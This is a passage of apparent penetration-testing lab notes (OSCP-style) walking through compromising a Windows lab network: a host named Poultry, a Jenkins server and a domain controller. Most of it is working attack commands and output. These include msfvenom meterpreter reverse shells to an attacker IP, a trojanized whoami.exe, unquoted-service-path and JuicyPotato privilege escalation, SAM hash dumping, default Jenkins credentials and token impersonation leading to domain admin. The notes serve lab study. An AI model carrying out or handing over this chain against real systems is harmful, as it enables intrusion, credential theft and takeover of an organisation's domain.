   Global Group memberships     *Domain Users
   The command completed successfully.
   ```

4. Show services set to startup automatically

   ```powershell
   C:\Users\alex>wmic service get name,displayname,pathname,startmode | findstr /i
   "auto" | findstr /i /v "c:\windows"
   McAfee Agent Common Services                            macmnsvc
           "C:\Program Files\McAfee\Agent\macmnsvc.exe" /ServiceStart
   
   
                                                          Auto
   McAfee Agent Service                                    masvc
           "C:\Program Files\McAfee\Agent\masvc.exe" /ServiceStart
   
   
                                                          Auto
   McAfee Service Controller                               mfemms
           "C:\Program Files\Common Files\McAfee\SystemCore\mfemms.exe"
   
   
                                                          Auto
   McAfee Endpoint Security Web Control Service            mfewc
           "C:\Program Files (x86)\McAfee\Endpoint Security\Web Control\mfewc.exe"
   
   
                                                          Auto
   Puppet Agent                                            puppet
           C:\Puppet\Current Version\sys\ruby\bin\ruby.exe -rubygems "C:\Puppet\Current Version\service\daemon.rb"
   
                                                          Auto
   VMware Alias Manager and Ticket Service                 VGAuthService
           "C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"
   
   
                                                          Auto
   VMware Tools                                            VMTools
           "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"
   
   
                                                          Auto
   ```

   Found unquoted service path with the Puppet Agent service.

#### Privilege Escalation

5. Examined puppet service in the services.msc console to find it is running as SYSTEM
   ![image-20200818172735909](.Lesson%2024%20Notes.assets/image-20200818172735909.png)

2. Examined c:\puppet directory to verify it is writable by users:

   ```powershell
   C:\Users\alex>icacls c:\puppet
   c:\puppet BUILTIN\Users:(W)
             BUILTIN\Administrators:(I)(F)
             BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
             NT AUTHORITY\SYSTEM:(I)(F)
             NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
             BUILTIN\Users:(I)(OI)(CI)(RX)
             NT AUTHORITY\Authenticated Users:(I)(M)
             NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(IO)(M)
   
   Successfully processed 1 files; Failed processing 0 files
   ```

3. Generated a meterpreter payload to inject into a binary:

   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.119.216 LPORT=80 -e x86/shikata_ga_nai -i 7 -f raw > met.bin
   ```

4. Used whoami.exe to carry the payload using Shellter:

   ```bash
   cp /usr/share/windows-resources/binaries/whoami.exe ./
   ```

5. Copied file to Windows, renamed to current.exe and placed in c:\puppet

6. Started meterpreter handler on port 80 on Kali and set it to auto-migrate the session to another process:

   ```bash
   sudo msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.119.216; set LPORT 80; set AutoRunScript post/windows/manage/migrate; run"
   ```

7. Restarted Poultry and got reverse shell as SYSTEM user
   ![image-20200818180149702](.Lesson%2024%20Notes.assets/image-20200818180149702.png)

8. Reset poultryadmin password for persistent access:

   ```bash
   C:\Windows\system32>net user poultryadmin OffSecHax1!
   net user poultryadmin OffSecHax1!
   The command completed successfully.
   ```

9. Logged in as poultryadmin through RDP

#### More Enumeration

1. Used meterpreter session to look for credentials:

   ```bash
   load kiwi
   lsa_dump_sam
   meterpreter > lsa_dump_sam
   [+] Running as SYSTEM
   [*] Dumping SAM
   Domain : POULTRY
   SysKey : 73cacb2f17162e339361be46e79c0aab
   Local SID : S-1-5-21-249117173-1144233687-1237767362
   
   SAMKey : 32b96069d8ce98f6b7bb288f2dc0cc5e
   
   RID  : 000001f4 (500)
   User : Administrator
     Hash NTLM: a9914884c0d4a08c4eef04b46c5e9ef2
       lm  - 0: 2ed16abbecfe2e4135de23a4f6399df1
       ntlm- 0: a9914884c0d4a08c4eef04b46c5e9ef2
       ntlm- 1: 10eca58175d4228ece151e287086e824
   
   RID  : 000001f5 (501)
   User : Guest
   
   RID  : 000003e8 (1000)
   User : poultryadmin
     Hash NTLM: ecea894d9db4925e8b1e36072b121cac
       lm  - 0: 4577deae68cc1a867558cef71026b1a2
       ntlm- 0: ecea894d9db4925e8b1e36072b121cac
       ntlm- 1: e3071bcf8c3ad25c891a8898f56aa62b
   ```

2. Looked for tickets

   ```bash
   eterpreter > list_tokens -u
   
   Delegation Tokens Available
   ========================================
   NT AUTHORITY\LOCAL SERVICE
   NT AUTHORITY\NETWORK SERVICE
   NT AUTHORITY\SYSTEM
   poultry\poultryadmin
   sandbox\Alex
   
   Impersonation Tokens Available
   ========================================
   NT AUTHORITY\ANONYMOUS LOGON
   ```

3. Checked Alex user's mailbox

   ```bash
   shell
   cd C:\Users\alex\AppData\Roaming\Thunderbird\Profiles\b8o2rld7.default-release\Mail\mail.sandbox.local
   ```

   Saw reference to an outdated host.

4. Performed a ping sweep from Poultry of the local network

   ```bash
   for /L %i in (1,1,255) do @ping -n 1 -w 200 10.5.5.%i > nul && echo 10.5.5.%i is up.
   ```

   Discovered:  10.5.5.1 (FW), 10.5.5.25, 10.5.5.30

5. Scanned discovered hosts for top 1000 ports

   ```bash
   proxychains nmap -sT --open --top-ports=1000 -Pn 10.5.5.25,30
   
   Nmap scan report for 10.5.5.30
   Host is up (0.80s latency).
   Not shown: 988 closed ports
   PORT STATE SERVICE
   53/tcp open domain
   88/tcp open kerberos-sec
   135/tcp open msrpc
   139/tcp open netbios-ssn
   389/tcp open ldap
   445/tcp open microsoft-ds
   464/tcp open kpasswd5
   593/tcp open http-rpc-epmap
   636/tcp open ldapssl
   3268/tcp open globalcatLDAP
   3269/tcp open globalcatLDAPssl
   3389/tcp open ms-wbt-server
   Nmap scan report for 10.5.5.25
   Host is up (0.80s latency).
   Not shown: 996 closed ports
   PORT STATE SERVICE
   135/tcp open msrpc
   139/tcp open netbios-ssn
   445/tcp open microsoft-ds
   8080/tcp open http-proxy
   Nmap done: 2 IP addresses (2 hosts up) scanned in 1593.55 seconds
   ```

6. Scanned open ports in-depth

   ```bash
   proxychains nmap -sT -sC -Pn -p53,88,135,139,389,445,464,593,636,3268,3269,3389 10.5.5.30
   Nmap scan report for 10.5.5.30
   Host is up (0.19s latency).
   
   PORT     STATE  SERVICE
   53/tcp   open   domain
   88/tcp   open   kerberos-sec
   135/tcp  open   msrpc
   139/tcp  open   netbios-ssn
   389/tcp  open   ldap
   445/tcp  open   microsoft-ds
   464/tcp  open   kpasswd5
   593/tcp  open   http-rpc-epmap
   636/tcp  open   ldapssl
   3268/tcp open   globalcatLDAP
   3269/tcp open   globalcatLDAPssl
   3389/tcp closed ms-wbt-server
   
   Host script results:
   |_clock-skew: mean: 2h20m05s, deviation: 4h02m48s, median: -5s
   | smb-os-discovery: 
   |   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
   |   Computer name: SANDBOXDC
   |   NetBIOS computer name: SANDBOXDC\x00
   |   Domain name: sandbox.local
   |   Forest name: sandbox.local
   |   FQDN: SANDBOXDC.sandbox.local
   |_  System time: 2020-08-18T17:44:03-07:00
   | smb-security-mode: 
   |   account_used: <blank>
   |   authentication_level: user
   |   challenge_response: supported
   |_  message_signing: required
   | smb2-security-mode: 
   |   2.02: 
   |_    Message signing enabled and required
   | smb2-time: 
   |   date: 2020-08-19T00:44:24
   |_  start_date: 2020-04-20T18:54:51
   ```

   ```bash
   proxychains nmap -sT -sC -Pn -p135,139,445,8080 10.5.5.25
   
   # Note, only one port below scanned in my case after several tries.  The book and video both got results though...
   
   Nmap scan report for 10.5.5.25
   Host is up (0.096s latency).
   
   PORT     STATE  SERVICE
   135/tcp  closed msrpc
   139/tcp  closed netbios-ssn
   445/tcp  closed microsoft-ds
   8080/tcp open   http-proxy
   | http-robots.txt: 1 disallowed entry 
   |_/
   |_http-title: Site doesn't have a title (text/html;charset=utf-8).
   
   Nmap done: 1 IP address (1 host up) scanned in 59.23 seconds
   ```


### Cevapi - Jenkins Server (10.5.5.25)

Jenkins automation software

#### Exploitation

1. Checked out Document Object Model (DOM) by viewing source code in Firefox.

2. Ran dirb scan of site

   ```bash
   proxychains dirb http://10.5.5.25:8080 -w
   ```

   Nothing good found

3. On a whim, tried credentials admin/admin and was able to get in.

4. Created a new project to run a windows batch command to download our malicious meterpreter payload.
   Note:  Not sure why I had to take off the `-c ""` part of this command for it to work.

   ```powershell
   powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.216:80/whoami.exe','c:\users\public\whoami.exe')
   ```

5. Setup meterpreter listener on Kali & executed Payload on Cevapi via Jenkins:
   NOTE:  I tried to auto-migrate this, but it kept disconnected.  I did it without it and was able to migrate the process after meterpreter connected.  I think it's because it's so slow.

   ```bash
   sudo msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOS
   T 192.168.119.216; set LPORT 80; run"
   ```

   ```bash
   # Executed on Cevapi
   c:\users\public\whoami.exe
   ```

#### Post-Exploitation Enumeration

1. User

   ```powershell
   C:\Windows\system32>whoami
   whoami
   cevapi\jenkinsuser
   
   C:\Windows\system32>net user jenkinsuser
   net user jenkinsuser
   User name                    jenkinsuser
   Full Name                    
   Comment                      
   User's comment               
   Country/region code          000 (System Default)
   Account active               Yes
   Account expires              Never
   
   Password last set            1/9/2020 6:38:48 PM
   Password expires             Never
   Password changeable          1/10/2020 6:38:48 PM
   Password required            No
   User may change password     Yes
   
   Workstations allowed         All
   Logon script                 
   User profile                 
   Home directory               
   Last logon                   4/20/2020 12:28:27 PM
   
   Logon hours allowed          All
   
   Local Group Memberships      *Users                
   Global Group memberships     *None                 
   The command completed successfully.
   
   :\Windows\system32>whoami /priv
   whoami /priv
   
   PRIVILEGES INFORMATION
   ----------------------
   
   Privilege Name                Description                               State   
   ============================= ========================================= ========
   SeShutdownPrivilege           Shut down the system                      Disabled
   SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
   SeUndockPrivilege             Remove computer from docking station      Disabled
   SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
   SeCreateGlobalPrivilege       Create global objects                     Enabled 
   SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
   SeTimeZonePrivilege           Change the time zone                      Disabled
   ```

   Noting:  SeImpersonatePrivilege

2. Open ports

   ```bash
     Proto  Local Address          Foreign Address        State           PID                                 [15/380]
     TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       908
     TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
     TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING       5436
     TCP    10.5.5.25:139          0.0.0.0:0              LISTENING       4   
   ```

3. Systeminfo

   ```bash
   C:\Windows\system32>systeminfo
   systeminfo
   
   Host Name:                 CEVAPI
   OS Name:                   Microsoft Windows 10 Pro
   OS Version:                10.0.15063 N/A Build 15063
   OS Manufacturer:           Microsoft Corporation
   OS Configuration:          Member Workstation
   OS Build Type:             Multiprocessor Free
   Registered Owner:          Windows User
   Registered Organization:   
   Product ID:                00331-10000-00001-AA648
   Original Install Date:     1/9/2020, 5:27:16 PM
   System Boot Time:          4/20/2020, 12:28:16 PM
   System Manufacturer:       VMware, Inc.
   System Model:              VMware7,1
   System Type:               x64-based PC
   Processor(s):              1 Processor(s) Installed.
                              [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~3094 Mhz
   BIOS Version:              VMware, Inc. VMW71.00V.13989454.B64.1906190538, 6/19/2019
   Windows Directory:         C:\Windows
   System Directory:          C:\Windows\system32
   Boot Device:               \Device\HarddiskVolume2
   System Locale:             en-us;English (United States)
   Input Locale:              en-us;English (United States)
   Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
   Total Physical Memory:     4,095 MB
   Available Physical Memory: 2,262 MB
   Virtual Memory: Max Size:  4,799 MB
   Virtual Memory: Available: 2,996 MB
   Virtual Memory: In Use:    1,803 MB
   Page File Location(s):     C:\pagefile.sys
   Domain:                    sandbox.local
   Logon Server:              N/A
   Hotfix(s):                 N/A
   Network Card(s):           1 NIC(s) Installed.
                              [01]: vmxnet3 Ethernet Adapter
                                    Connection Name: Ethernet0
                                    DHCP Enabled:    No
                                    IP address(es)
                                    [01]: 10.5.5.25
   Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
   ```

   Windows build is old, check for vulnerabilities

#### Privilege Escalation

1. Googling the SeImpersonatePrivilege leads me to a juicy-potato https://github.com/ohpe/juicy-potato, but I used the one from OSCP instead.

2. Uploaded JuicyPotato.exe to c:\users\public\mrpotato.exe

   ```bash
   upload JuicyPotato.exe c:\\users\\public\\mrpotato.exe
   ```

3. Backgrounded meterperter for Cevapi & started a new Kali Listener

4. Used Jenkins to run mrpotato.exe to escalate privileges

   ```powershell
   c:\users\public\mrpotato.exe -t t -p c:\users\public\whoami.exe -l 5837
   
   # Options
   -t t	# Process creation mode, create process with 'Token' for seimpersonate privilege
   -p c:\users\public\whoami.exe	# specifies program to run
   -l 5837		# Specifies port for COM listener to listen on
   ```

5. Checked user of meterpereter session to verify SYSTEM account

   ```powershell
   C:\Windows\system32>whoami
   whoami
   nt authority\system
   ```

#### Post-Post Exploitation Enumeration

1. Used incognito to list tokens in meterpreter

   ```bash
   load incognito
   list_tokens -u
   ```

   sandbox\Administrator account is available

2. Impersonated token of domain admin account

   ```bash
   impersonate_token sandbox\\Administrator
   ```

3. Verified user is domain admin

   ```bash
   C:\Windows\system32>whoami
   sandbox\administrator                                    
   
   C:\Windows\system32>net users /domain administrator
   net users /domain administrator
   The request will be processed at a domain controller for domain sandbox.local.
   
   User name                    Administrator
   Full Name                    
   Comment                      Built-in account for administering the computer/domain
   User's comment               
   Country/region code          000 (System Default)
   Account active               Yes
   Account expires              Never
   
   Password last set            1/9/2020 7:51:48 PM
   Password expires             Never
   Password changeable          1/10/2020 7:51:48 PM
   Password required            Yes
   User may change password     Yes
   
   Workstations allowed         All
   Logon script                 
   User profile                 
   Home directory               
   Last logon                   8/18/2020 8:21:28 PM
   
   Logon hours allowed          All
   
   Local Group Memberships      *Administrators       
   Global Group memberships     *Enterprise Admins    *Schema Admins        
                                *Domain Admins        *Group Policy Creator 
                                *Domain Users         
   The command completed successfully.
   ```

### DC (10.5.5.30)

#### Exploitation

1. Discover the hostname of the DC

   ```powershell
   # Enter nslookup
   nslookup
   # Set the lookup type to all
   set type=all
   # Show hostname of the DC
   _ldap._tcp.dc._msdcs.sandbox.local
   
   # Output
   Server:  UnKnown
   Address:  10.5.5.30
   
   _ldap._tcp.dc._msdcs.sandbox.local      SRV service location:
             priority       = 0
             weight         = 100
             port           = 389
             svr hostname   = SANDBOXDC.sandbox.local
   SANDBOXDC.sandbox.local internet address = 10.5.5.30
   ```

   DC Name is SANDBOXDC

2. Start a remote Powershell session with the DC

   ```powershell
   # Create a new session object for the DC
   $dcsesh = New-PSSession -Computer SANDBOXDC
   
   # Run commands against the DC using PowerShell
   # The command to execute must be wrapped in curly brackets
   Invoke-Command -Session $dcsesh -ScriptBlock {ipconfig}
   ```

3. Copy the meterpreter exploit whoami.exe to the DC

   ```powershell
   Copy-Item "C:\Users\Public\whoami.exe" -Destination "C:\Users\Public\" -ToSession $dcsesh
   ```

4. Started meterpreter listener on Kali Linux

   ```bash
   udo msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.119.216; set LPORT 80; run"
   ```

5. Run the exploit

   ```powershell
   Invoke-Command -Session $dcsesh -ScriptBlock {C:\Users\Public\whoami.exe}
   ```

6. Receive meterpreter session from DC as domain admin user
   ![image-20200818223359143](.Lesson%2024%20Notes.assets/image-20200818223359143.png)
   ![image-20200818223507806](.Lesson%2024%20Notes.assets/image-20200818223507806.png)